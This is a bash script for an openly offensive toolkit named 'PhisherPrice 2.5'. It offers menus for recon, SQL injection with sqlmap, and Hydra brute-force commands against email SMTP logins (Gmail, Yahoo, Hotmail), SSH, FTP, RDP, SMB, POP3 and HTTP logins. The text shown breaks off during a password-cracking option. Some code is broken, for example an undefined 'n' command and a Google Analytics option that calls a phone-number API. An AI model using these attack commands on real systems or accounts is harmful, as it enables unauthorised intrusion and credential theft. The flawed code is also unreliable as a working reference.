#!/bin/bash
# PhiserPrice2.5
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
   exit 1
fi
i="0"
clear
while [ $i -lt 1 ]
do
clear

#COLOUR
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'

ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m
(1) Recon
(2) Cracking
(3) AutoxSploits
(4) Networking
(5) C.Y.O xSploits
(6) AutoExif  
(7) SE Toolkit
(8) Start Th3inspector
(u) Update Script
(c) Contact Information
CTRL + C To Exit
'
option1='1'
option2='2'
option3='3'
option4='4'
option5='5'
option6='6'
option7='7'
option8='8'
update='u'
contact='c'

echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"ToolSet$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$option1" ]; then                    #Option1
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Recon & Auditing
\e[3;39m
(s1) Stealth Ping
(s2) Whois Info
(s3) Geo IP
(s4) IP Lookup
(s5) DNS Lookup
(s6) Reverse DNS Lookup
(s7) Shared DNS Lookup
(s8) Nmap Scan
(s9) SSH Scanner (Scan for weak cyphers)
(s10) SSL/TLS Scanner (Scan for weak cyphers)
(s11) Retreive HTTP Headers
(s12) Autonomous System Lookup (AS/ASN/IP)
(s13) Banner Grab
(s14) Extract All Links From Host
(s15) Phone Number Lookup
(s16) Reverse Analytics
(s17) Get Server Users
(s18) SQL Map
(s19) SQL Map (Quick/Deep)

CTRL + C To Exit
Press ENTER To Go To Main Menu
'
sub1='s1'
sub2='s2'
sub3='s3'
sub4='s4'
sub5='s5'
sub6='s6'
sub7='s7'
sub8='s8'
sub9='s9'
sub10='s10'
sub11='s11'
sub12='s12'
sub13='s13'
sub14='s14'
sub15='s15'
sub16='s16'
sub17='s17'
sub18='s18'
sub19='s19'

echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$sub1" ]; then                    #Sub-Option-1
clear
echo -e '\e[1;33m
  _________ __                .__   __  .__      __________.__                
 /   _____//  |_  ____ _____  |  |_/  |_|  |__   \______   \__| ____    ____  
 \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   |     ___/  |/    \  / ___\ 
 /        \|  | \  ___/ / __ \|  |_|  | |   Y  \  |    |   |  |   |  \/ /_/  >
/_______  /|__|  \___  >____  /____/__| |___|  /  |____|   |__|___|  /\___  / 
        \/           \/     \/               \/                    \//_____/\e[1;34m
'  
echo "this is not a joke either :)"
echo "who do you want to ping?"
read pihost
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!! Pinging The Host Like A NINJA :D !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl https://api.hackertarget.com/nping/?q=$pihost

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!    We Escaped Undetected :D      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub2" ]; then                    #Sub-Option-2
echo "what website do you want Information About?"
read subop2
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!Gathering Information About Host!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

whois $subop2

read

elif [ "$x" == "$sub3" ]; then                    #Sub-Option-3
clear
echo -e '\e[1;33m
  ________             ._____________ 
 /  _____/  ____  ____ |   \______   \
/   \  ____/ __ \/  _ \|   ||     ___/
\    \_\  \  ___(  <_> )   ||    |    
 \______  /\___  >____/|___||____|    
        \/     \/                     \e[1;34m
' 
echo "Enter IP Or Domain."
read subop3
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Getting Geo Ip Information   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl http://api.hackertarget.com/geoip/?q=$subop3
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  Geo Ip Found Using PhiserPrice  !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub4" ]; then                    #Sub-Option-4
clear
echo -e '\e[1;33m
__________._____________  .____                  __                 
\______   \   \______   \ |    |    ____   ____ |  | ____ ________  
 |       _/   ||     ___/ |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    |   \   ||    |     |    |__(  <_> |  <_> )    <|  |  /  |_> >
 |____|_  /___||____|     |_______ \____/ \____/|__|_ \____/|   __/ 
        \/      Reverse IP Lookup \/                 \/     |__|    \e[1;34m
'  
echo "Enter IP Or Domain."
read subop4
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Getting Ip Information     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl http://api.hackertarget.com/reverseiplookup/?q=$subop4

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!! ReverseIP Found Using PhiserPrice !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read
elif [ "$x" == "$sub5" ]; then                    #Sub-Option-5
clear
echo -e '\e[1;33m
________    _______    _________ .____                  __                 
\______ \   \      \  /   _____/ |    |    ____   ____ |  | ____ ________  
 |    |  \  /   |   \ \_____  \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    `   \/    |    \/        \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
/_______  /\____|__  /_______  / |_______ \____/ \____/|__|_ \____/|   __/ 
        \/         \/        \/          \/                 \/     |__|    \e[1;34m
'  
echo "Enter IP Address - IP Range Or Domain"
read subop5
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! !! Getting DNS Information   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl http://api.hackertarget.com/dnslookup/?q=$subop5

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  DNS Information Found Using PhiserPrice  !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub6" ]; then                    #Sub-Option-6
clear
echo -e '\e[1;33m
__________                                         ________    _______    _________
\______   \ _______  __ ___________  ______ ____   \______ \   \      \  /   _____/
 |       _// __ \  \/ // __ \_  __ \/  ___// __ \   |    |  \  /   |   \ \_____  \ 
 |    |   \  ___/\   /\  ___/|  | \/\___ \\  ___/   |    `   \/    |    \/        \
 |____|_  /\___  >\_/  \___  >__|  /____  >\___  > /_______  /\____|__  /_______  /
        \/     \/          \/           \/     \/          \/         \/        \/ \e[1;34m
' 
echo "Enter IP Or Domain."
read subop6
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! !! Getting DNS Information   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl https://api.hackertarget.com/reversedns/?q=$subop6

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  DNS Information Found Using PhiserPrice  !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read
elif [ "$x" == "$sub7" ]; then                    #Sub-Option-7
clear
echo -e '\e[1;33m
  _________.__                             .___ ________    _______    _________
 /   _____/|  |__ _____ _______   ____   __| _/ \______ \   \      \  /   _____/
 \_____  \ |  |  \\__  \\_  __ \_/ __ \ / __ |   |    |  \  /   |   \ \_____  \ 
 /        \|   Y  \/ __ \|  | \/\  ___// /_/ |   |    `   \/    |    \/        \
/_______  /|___|  (____  /__|    \___  >____ |  /_______  /\____|__  /_______  /
        \/      \/     \/            \/     \/          \/         \/        \/ \e[1;34m
' 
echo "Enter IP Or Domain."
read subop7
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  Finding Shared DNS Servers      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl https://api.hackertarget.com/findshareddns/?q=$subop7

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!! Shared DNS Servers Found Using PhiserPrice !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub8" ]; then                    #Sub-Option-8
clear
echo -e '\e[1;33m
 _______      _____      _____ __________    _________                     
 \      \    /     \    /  _  \\______   \  /   _____/ ____ _____    ____  
 /   |   \  /  \ /  \  /  /_\  \|     ___/  \_____  \_/ ___\\__  \  /    \ 
/    |    \/    Y    \/    |    \    |      /        \  \___ / __ \|   |  \
\____|__  /\____|__  /\____|__  /____|     /_______  /\___  >____  /___|  /
        \/         \/         \/                   \/     \/     \/     \/ \e[1;34m
'
echo "Enter IP Or Domain."
read subop8
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!   Getting Open Ports      !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl http://api.hackertarget.com/nmap/?q=$subop8

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!    Open Ports Found Using PhiserPrice     !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub9" ]; then                    #Sub-Option-9
echo "Enter The Host You Want To Scan."
read subop9
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!     Scanning Host SSH For Vulns      !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
clear
sshscan.py -t $subop9

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Host Scanned Using SSHSCAN/PhiserPrice!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read
elif [ "$x" == "$sub10" ]; then                    #Sub-Option-10
echo "Enter The Host You Want To Scan.(testsite.com)"
read subop10
echo "Enter The Host Port You Want To Scan. ( 443 )"
read subop10port
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Scanning Host SSL/TLS For Vulns    !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

tlssled $subop10 $subop10port

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Host Scanned Using PhiserPrice     !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub11" ]; then                    #Sub-Option-11
clear
echo -e '\e[1;33m
  ___ ___________________________________  _________                     
 /   |   \__    ___/\__    ___/\______   \/   _____/ ____ _____    ____  
/    ~    \|    |     |    |    |     ___/\_____  \_/ ___\\__  \  /    \ 
\    Y    /|    |     |    |    |    |    /        \  \___ / __ \|   |  \
 \___|_  / |____|     |____|    |____|   /_______  /\___  >____  /___|  /
       \/  HTTP Header Scan                      \/     \/     \/     \/ \e[1;34m
'
echo "Enter The Host You Want To Scan."
read subop11
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        Checking HTTP Headers         !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl https://api.hackertarget.com/httpheaders/?q=$subop11

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
! HTTP Headers Scanned Using PhiserPrice !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub12" ]; then                    #Sub-Option-12
clear
echo -e '\e[1;33m
   _____    _________ _______    .____                  __                 
  /  _  \  /   _____/ \      \   |    |    ____   ____ |  | ____ ________  
 /  /_\  \ \_____  \  /   |   \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
/    |    \/        \/    |    \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
\____|__  /_______  /\____|__  / |_______ \____/ \____/|__|_ \____/|   __/ 
        \/        \/         \/          \/                 \/     |__|    \e[1;34m
'  
echo "Enter The ASN You Want To Scan."
echo "example usage: 1.1.1.1 / AS15169"
read subop12
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        Scanning ASN Host             !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl https://api.hackertarget.com/aslookup/?q=$subop12

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  Host Scanned Using PhiserPrice    !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub13" ]; then                    #Sub-Option-13
clear
echo -e '\e[1;33m
__________                                       ________            ___.    
\______   \_____    ____   ____   ___________   /  _____/___________ \_ |__  
 |    |  _/\__  \  /    \ /    \_/ __ \_  __ \ /   \  __\_  __ \__  \ | __ \ 
 |    |   \ / __ \|   |  \   |  \  ___/|  | \/ \    \_\  \  | \// __ \| \_\ \
 |______  /(____  /___|  /___|  /\___  >__|     \______  /__|  (____  /___  /
        \/      \/     \/     \/     \/                \/           \/    \/ \e[1;34m
' 
echo "Enter Host's IP"
read subop13
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!    Getiing Host Information   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl https://api.hackertarget.com/bannerlookup/?q=$subop13

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Host Information Found Using PhisherPrice  !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub14" ]; then                    #Sub-Option-14
clear
echo -e '\e[1;33m
.____    .__        __       _________      .__  _____  _____             
|    |   |__| ____ |  | __  /   _____/ ____ |__|/ ____\/ ____\___________ 
|    |   |  |/    \|  |/ /  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
|    |___|  |   |  \    <   /        \   |  \  ||  |   |  | \  ___/|  | \/
|_______ \__|___|  /__|_ \ /_______  /___|  /__||__|   |__|  \___  >__|   
        \/       \/     \/         \/     \/                     \/       \e[1;34m
'
echo "this can reveal social media pages etc."
echo "Enter Domain Name"
read subop14
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!     Extracting Host Links     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl https://api.hackertarget.com/pagelinks/?q=$subop14

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Host Links Extracted Using PhisherPrice  !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub15" ]; then                    #Sub-Option-15
clear
echo -e '\e[1;33m
__________.__                           .____                  __                 
\______   \  |__   ____   ____   ____   |    |    ____   ____ |  | ____ ________  
 |     ___/  |  \ /  _ \ /    \_/ __ \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    |   |   Y  (  <_> )   |  \  ___/  |    |__(  <_> |  <_> )    <|  |  /  |_> >
 |____|   |___|  /\____/|___|  /\___  > |_______ \____/ \____/|__|_ \____/|   __/ 
               \/            \/     \/          \/                 \/     |__|    \e[1;34m
'
echo "Please Enter The Number Followed By The Dialing Code"
echo "for example : +447410490080 / +44 Is My Dialing Code"
read subop15
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!  Looking Up Info About The Number  !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
curl https://api.telnyx.com/v1/phone_number/$subop15

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Phone Info Found Using PhisherPrice    !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub16" ]; then                    #Sub-Option-16
clear
echo -e '\e[1;33m
__________              _____                .__           __  .__               
\______   \ _______  __/  _  \   ____ _____  |  | ___.__._/  |_|__| ____   ______
 |       _// __ \  \/ /  /_\  \ /    \\__  \ |  |<   |  |\   __\  |/ ___\ /  ___/
 |    |   \  ___/\   /    |    \   |  \/ __ \|  |_\___  | |  | |  \  \___ \___ \ 
 |____|_  /\___  >\_/\____|__  /___|  (____  /____/ ____| |__| |__|\___  >____  >
        \/     \/            \/     \/     \/     \/ Reverse Analytics \/     \/ \e[1;34m
'  
echo "Find Domains Using Same Google Ad-Sense ID"
echo "Enter Domain Name Or GA-ID"
echo "For example: UA-11223344 or testsite.com"
read subop16

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!       Retrieving Hosts/GA-ID       !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl https://api.telnyx.com/anonymous/v2/number_lookup/$subop16

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Host Info Found Using PhisherPrice     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub17" ]; then                    #Sub-Option-17
clear
echo -e '\e[1;33m
 ____ ___                       _________                           .__     
|    |   \______ ___________   /   _____/ ____ _____ _______   ____ |  |__  
|    |   /  ___// __ \_  __ \  \_____  \_/ __ \\__  \\_  __ \_/ ___\|  |  \ 
|    |  /\___ \\  ___/|  | \/  /        \  ___/ / __ \|  | \/\  \___|   Y  \
|______//____  >\___  >__|    /_______  /\___  >____  /__|    \___  >___|  /
             \/     \/                \/     \/     \/            \/     \/ \e[1;34m
'
echo "Enter Domain Name Or IP"
read subop17

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!       Retrieving Host  Users       !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

enum4linux -M -G -P -S -U $subop17

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Host Info Found Using PhisherPrice     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub18" ]; then                    #Sub-Option-18
clear
echo -e '\e[1;33m
  _________________  .____         _____                                     
 /   _____/\_____  \ |    |       /     \ _____  ______ ______   ___________ 
 \_____  \  /  / \  \|    |      /  \ /  \\__  \ \____ \\____ \_/ __ \_  __ \
 /        \/   \_/.  \    |___  /    Y    \/ __ \|  |_> >  |_> >  ___/|  | \/
/_______  /\_____\ \_/_______ \ \____|__  (____  /   __/|   __/ \___  >__|   
        \/        \__>       \/         \/     \/|__|   |__|        \/       \e[1;34m
'
echo "This Will Audit Database's Automatically"
echo "Using Random User-Agents."
echo "Enter Domain Name Or IP"
read sql1
echo "Database Type If You Know It, If Not Leave This Blank"
echo "Press Enter If You're Unsure"
read db
echo "Level of tests to perform (1-5, default 1)"
read levelt
echo "Risk of tests to perform (1-3, default 1)"
read risksl
echo "SQL injection techniques to use (default : BEUSTQ)"
echo "Press Enter To Leave Default"
read techskill
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!       Auditing Host SQL Info       !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

sqlmap --dbms=$db --forms --crawl=2 --level=$levelt --risk=$risksl --random-agent --all --technique=$techskill -u $sql1

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Audit Conducted Using PhisherPrice     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read
elif [ "$x" == "$sub19" ]; then                    #sub-Option-19
clear
echo -e '\e[1;33m
  _________________  .____     
 /   _____/\_____  \ |    |    
 \_____  \  /  / \  \|    |    
 /        \/   \_/.  \    |___ 
/_______  /\_____\ \_/_______ \
        \/        \__>       \/ Brute Force \e[1;34m
'
echo "Enter Website"
read sqlhost2
echo "php or html ?"
read phphtml1

sqlmap -u $sqlhost2  searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5

read

else 

n


fi

elif [ "$x" == "$option2" ]; then                          #Option2
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Cracking / Brute Force
\e[3;39m
(c1) Auto-Brute (Hydra)
(c2) John-The-Ripper
(c3) Hash-Identifier
(c4) Hashcat
(c5) Aircrack-ng (Crack Wifi Pass)
(c6) Start sqldict

CTRL + C To Exit
Press ENTER To Go To Main Menu
'
subf='c1'
subg='c2'
subh='c3'
subi='c4'
subj='c5'
subk='c6'


wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$subf" ]; then                    #Sub-Option-f
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Hydra Brute Force
\e[3;39m
(h1) Email Crack (SMTP)
(h2) SNMP Brute Force
(h3) FTP Brute Force
(h4) SSH  Brute Force
(h5) SSH  Brute Force (port 22)
(h6) POP3 Brute Force
(h7) HTTP 401 Brute Force
(h8) Windows RDP Brute Force
(h9) SMB Brute Force


CTRL + C To Exit
Press ENTER To Go To Main Menu
'
hynull1='h1'
hynull2='h2'
hynull3='h3'
hynull4='h4'
hynull5='h5'
hynull6='h6'
hynull7='h7'
hynull8='h8'
newoption1='h9'


echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
clear
echo -e '\e[1;33m
   _____                       __    
  / ___ \____________    ____ |  | __
 / / ._\ \_  __ \__  \ _/ ___\|  |/ /
<  \_____/|  | \// __ \\  \___|    < 
 \_____\  |__|  (____  /\___  >__|_ \
                     \/     \/     \/\e[1;34m
'
echo "Simple Email Cracking Script Using Hydra."
echo "Written By: NULLSec"
echo "NOTE: Make sure you have wordlists!"
echo "Let us Begin:"
echo "Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:"
read smtp
echo "Enter Email Address:"
read email
echo "Provide Directory of Wordlist for Passwords:"
read wordlist
clear

hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

read

elif [ "$x" == "$hynull2" ]; then                    #hynull-Option-2
clear
echo -e '\e[1;33m
  _________ _______      _____ __________ 
 /   _____/ \      \    /     \\______   \
 \_____  \  /   |   \  /  \ /  \|     ___/
 /        \/    |    \/    Y    \    |    
/_______  /\____|__  /\____|__  /____|    
        \/         \/         \/ Brute Force \e[1;34m
'
echo "Enter The Password List Location"
read hydrasnmppass
echo "Enter The Host IP Address of SNMP Server"
read hydraip

hydra -P $hydrasnmppass -v $hydraip snmp

read

elif [ "$x" == "$hynull3" ]; then                    #hynull-Option-3
clear
echo -e '\e[1;33m
________________________________ 
\_   _____/\__    ___/\______   \
 |    __)    |    |    |     ___/
 |     \     |    |    |    |    
 \___  /     |____|    |____|    
     \/ Brute Force\e[1;34m
'
echo "Enter Known User"
read hydrauser1
echo "Enter The Password List Location:"
read hydrapasslist1
echo "Enter The IP Address"
read hydraip1

hydra -t 1 -l $hydrauser1 -P $hydrapasslist1 -vV $hydraip1 ftp

read

elif [ "$x" == "$hynull4" ]; then                    #hynull-Option-4
clear
echo -e '\e[1;33m
  _________ _________ ___ ___  
 /   _____//   _____//   |   \ 
 \_____  \ \_____  \/    ~    \
 /        \/        \    Y    /
/_______  /_______  /\___|_  / 
        \/        \/       \/ Brute Force \e[1;34m
'
echo "Enter Your User List Location"
read hydrauser2
echo "Enter The Password List Location:"
read hydrapasslist2
echo "Enter The IP Address"
read hydraip2

hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh

read

elif [ "$x" == "$hynull5" ]; then                    #hynull-Option-5
clear
echo -e '\e[1;33m
  _________ _________ ___ ___  
 /   _____//   _____//   |   \ 
 \_____  \ \_____  \/    ~    \
 /        \/        \    Y    /
/_______  /_______  /\___|_  / 
        \/        \/       \/ Brute Force \e[1;34m
'
echo "Enter Your Known User"
read hydrauser3
echo "Enter The Password List Location:"
read hydrapasslist3
echo "Enter The IP Address"
read hydraip3

hydra $hydraip3 -s 22 ssh -l $hydrauser3 -P $hydrapasslist3

read

elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
clear
echo -e '\e[1;33m
                    ________  
______   ____ ______\_____  \ 
\____ \ /  _ \\____ \ _(__  < 
|  |_> >  <_> )  |_> >       \
|   __/ \____/|   __/______  /
|__|          |__|         \/ Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser4
echo "Enter The Password List Location:"
read hydrapasslist4
echo "Enter The IP Address"
read hydraip4


hydra -l $hydrauser4 -P $hydrapasslist4 -f $hydraip4 pop3 -V

read

elif [ "$x" == "$hynull7" ]; then                    #hynull-Option-7
clear
echo -e '\e[1;33m
   _____  _______  ____ 
  /  |  | \   _  \/_   |
 /   |  |_/  /_\  \|   |
/    ^   /\  \_/   \   |
\____   |  \_____  /___|
     |__|        \/ Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser5
echo "Enter The Password List Location:"
read hydrapasslist5
echo "Enter The IP Address"
read hydraip5
echo "enter the 401 Login"
read hyhost

hydra -L $hydrauser5 -P $hydrapasslist5 $hydraip5 http-get /$hyhost

read

elif [ "$x" == "$hynull8" ]; then                    #hynull-Option-8
clear
echo -e '\e[1;33m
__________________ __________ 
\______   \______ \\______   \
 |       _/|    |  \|     ___/
 |    |   \|    `   \    |    
 |____|_  /_______  /____|    
        \/        \/ Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser8
echo "Enter The Password List Location:"
read hydrapasslist8
echo "Enter The IP Address"
read hydraip8

hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8

read

elif [ "$x" == "$newoption1" ]; then                    #hynull-Option-9
clear
echo -e '\e[1;33m
  _________   _____ __________ 
 /   _____/  /     \\______   \
 \_____  \  /  \ /  \|    |  _/
 /        \/    Y    \    |   \
/_______  /\____|__  /______  /
        \/         \/       \/ Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser9
echo "Enter The Password List Location:"
read hydrapasslist9
echo "Enter The IP Address"
read hydraip9


hydra -t 1 -V -f -l $hydrauser9 -P $hydrapasslist9 $hydraip9 smb

read

else 

n


fi

elif [ "$x" == "$subg" ]; then                    #Sub-Option-g
echo "enter your wordlist eg :/usr/share/john/password.lst"
read jwords
echo "Enter File Location eg: /usr/john/Documents/unshadowed.txt"
read $jfiles
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
